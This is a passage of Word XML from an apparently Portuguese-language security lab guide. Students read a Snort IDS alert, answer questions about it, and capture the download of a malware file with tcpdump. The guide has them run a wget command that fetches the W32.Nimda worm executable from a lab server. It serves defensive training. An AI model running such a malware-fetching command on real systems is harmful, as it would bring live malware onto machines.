    <w:p w14:paraId="633AE4CC" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Como o arquivo malicioso estava transitando </w:t>
      </w:r>
      <w:r w:rsidRPr="008A561B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, o IDS, Snort, foi capaz de inspecionar sua carga útil. A carga correspondeu a pelo menos uma das assinaturas configuradas no Snort e disparou um alerta na segunda janela do terminal </w:t>
      </w:r>
      <w:r w:rsidRPr="008A561B">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (a guia onde o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tail -f</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> está sendo executado). A entrada de alerta é mostrada abaixo. Seu carimbo de data/hora será diferente:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65685214" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>04/28-17:00:04.092153 [**] [1:1000003:0] Malicious Server Hit! [**] [Priority: 0] {TCP} 209.165.200.235:34484 -&gt; 209.165.202.133:6666</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673E71E3" w14:textId="61A40527" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Perguntas:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E21BFA6" w14:textId="1EA6274D" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:before="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Com base no alerta mostrado acima, quais foram os endereços IPv4 de origem e destino usados na transação?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A99247D" w14:textId="152F2DB0" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6019C040" w14:textId="599627CA" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F1465E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Com base no alerta mostrado acima, quais foram as portas de origem e destino usadas na transação?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13B88BE2" w14:textId="3A711D64" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DB22A3" w14:textId="2BC9D5B7" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56CC9BC5" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Com base no alerta mostrado acima, quando o download ocorreu?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20742D8A" w14:textId="1B5F2A43" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2403CAA6" w14:textId="40A7142B" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4081FFAC" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t>Com base no alerta mostrado acima, qual foi a mensagem registrada pela assinatura IDS?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D9C87A" w14:textId="2AB8E097" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47ECA345" w14:textId="595D5AB5" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C407BAF" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00B41011" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Em </w:t>
      </w:r>
      <w:r w:rsidRPr="00B41011">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, use o comando </w:t>
      </w:r>
      <w:r w:rsidRPr="00B41011">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para capturar o evento e baixar o arquivo de malware novamente para que você possa capturar a transação. Execute o seguinte comando abaixo iniciar a captura de pacotes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D5DED0" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> tcpdump —i H5-eth0 —w nimda.download.pcap &amp;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17D19D2B" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="004F749B" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>[1] 5633</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8738A9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>[root@secOps analyst]# tcpdump: listening on H5-eth0, link-type EN10MB (Ethernet), capture size 262144 bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61959484" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">O comando acima instrui o tcpdump para capturar pacotes na interface </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H5-eth0</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> e salvar a captura em um arquivo chamado </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nimda.download.pcap</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="426F8616" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>O</w:t>
      </w:r>
      <w:r w:rsidRPr="00B51975">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> &amp;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> símbolo no final diz ao shell para executar o</w:t>
      </w:r>
      <w:r w:rsidRPr="00B51975">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> tcpdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> em segundo plano. Sem este símbolo, o </w:t>
      </w:r>
      <w:r w:rsidRPr="00B51975">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tornaria o terminal inutilizável enquanto ele estava em execução. Observe o </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>[1] 5633</w:t>
      </w:r>
      <w:r>
        <w:t>; ele indica que um processo foi enviado para segundo plano e seu ID de processo (PID) é 5366. Seu PID provavelmente será diferente.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B77D6AE" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Pressione </w:t>
      </w:r>
      <w:r w:rsidRPr="00C40E50">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ENTER</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> algumas vezes para recuperar o controle do shell enquanto o </w:t>
      </w:r>
      <w:r w:rsidRPr="00B51975">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> é executado em segundo plano.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F739F23" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Agora que o </w:t>
      </w:r>
      <w:r w:rsidRPr="00C40E50">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> está capturando pacotes, baixe o malware novamente. Em </w:t>
      </w:r>
      <w:r w:rsidRPr="00C40E50">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H5</w:t>
      </w:r>
      <w:r>
        <w:t>, execute novamente o comando ou use a seta para cima para recuperá-lo do recurso de histórico de comandos.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21ACD7F6" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> wget 209.165.202. 133:6666 /W32.Nimda.amm.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE5AE76" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009B39D9" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>--2017-05-02 10:26:50-- http://209.165.202.133:6666/W32.Nimda.Amm.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C62EA9D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009B39D9" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Connecting to 209.165.202.133:6666... connected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CF6BB8" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009B39D9" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP request sent, awaiting response... 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75642DC9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009B39D9" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Length: 345088 (337K) [application/octet-stream]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3D5DD9" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009B39D9" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>Saving to: 'W32.Nimda.Amm.exe'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="104621FB" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009B39D9" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D924CFC" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009B39D9" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">W32.Nimda.amm.exe 100% [===================&gt;] 337.00K -.-KB/s em 0.003s  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A03F3C" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009B39D9" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EA692A0" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="009B39D9" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>2017-05-02 10:26:50 (105 MB/s) - 'W32.Nimda.Amm.exe' saved [345088/345088]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1753D5F3" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="001E63B0" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Pare a captura trazendo</w:t>
      </w:r>
      <w:r w:rsidRPr="00685945">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> tcpdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para primeiro plano com o comando </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>fg</w:t>
      </w:r>
      <w:r>
        <w:t>. Como</w:t>
      </w:r>
      <w:r w:rsidRPr="00685945">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> tcpdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> foi o único processo enviado para segundo plano, não há necessidade de especificar o PID. Pare o processo </w:t>
      </w:r>
      <w:r w:rsidRPr="00685945">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> com </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ctrl+C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. O processo </w:t>
      </w:r>
      <w:r w:rsidRPr="00685945">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tcpdump</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para e exibe um resumo da captura. O número de pacotes pode ser diferente para sua captura.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06438C3E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="006B299C" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #</w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> fg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6867EC81" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>tcpdump -i h5-eth0 -w nimda.download.pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E903BA" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>^C</w:t>
      </w:r>
      <w:r>
        <w:t>316 packets captured</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0740E1DF" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>316 packets received by filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F25DFAF" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>0 packets dropped by kernel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0314D7" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00B2177E" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>[root@secOps analyst]#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="504354E5" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="001E63B0" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Em </w:t>
      </w:r>
      <w:r w:rsidRPr="00C40E50">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>H5</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, use o comando </w:t>
      </w:r>
      <w:r w:rsidRPr="00C8638D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para verificar se o arquivo pcap foi, de fato, salvo no disco e tem tamanho maior que zero:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421CB866" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMD"/>
      </w:pPr>
      <w:r>
        <w:t>[root @secOps analyst] #</w:t>
      </w:r>
      <w:r w:rsidRPr="004C70B3">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> ls -l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62DAE769" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>total 1400</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EC967E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>drwxr-xr-x 2 analyst analyst 4096 Sep 26 2014 Desktop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4956101A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>drwx------ 3 analyst analyst 4096 Jul 14 11:28 Downloads</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05B4955C" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>drwxr-xr-x 8 analyst analyst 4096 Jul 25 16:27 lab.support.files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD2A1B7" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>-rw-r--r-- 1 root root 371784 Aug 17 14:48 nimda.download.pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A92EBA1" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>drwxr-xr-x 2 analyst analyst 4096 Mar 3 15:56 second_drive</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51666CF5" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>-rw-r--r-- 1 root root 345088 Apr 14 15:17 W32.Nimda.Amm.exe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="616EDB4D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t>-rw-r--r-- 1 root root 345088 Apr 14 15:17 W32.Nimda.Amm.exe.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E0132E" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> [root@secOps analyst]# </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534CAF5D" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="CMDOutput"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FF0731A" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observação</w:t>
      </w:r>
      <w:r>
        <w:t>: Sua lista de diretórios pode ter uma combinação diferente de arquivos, mas você ainda deve ver o  arquivo nimda.download.pcap.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0200385C" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="Ttulo4"/>
      </w:pPr>
      <w:r>
        <w:t>Pergunta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067C9101" w14:textId="24EF0E31" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="BodyTextL50"/>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:t>Como esse arquivo PCAP pode ser útil para o analista de segurança?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="138A078F" w14:textId="3FB423D9" w:rsidR="00CB6E06" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="AnswerLineL50"/>
        <w:spacing w:after="720"/>
      </w:pPr>
      <w:r>
        <w:t>Digite suas respostas aqui.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3150B006" w14:textId="25735FD7" w:rsidR="00CB6E06" w:rsidRDefault="00EA47B7" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="AnswerGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7D9D0F" w14:textId="77777777" w:rsidR="00CB6E06" w:rsidRPr="00B2177E" w:rsidRDefault="00CB6E06" w:rsidP="00CB6E06">
      <w:pPr>
        <w:pStyle w:val="SubStepAlpha"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nota</w:t>
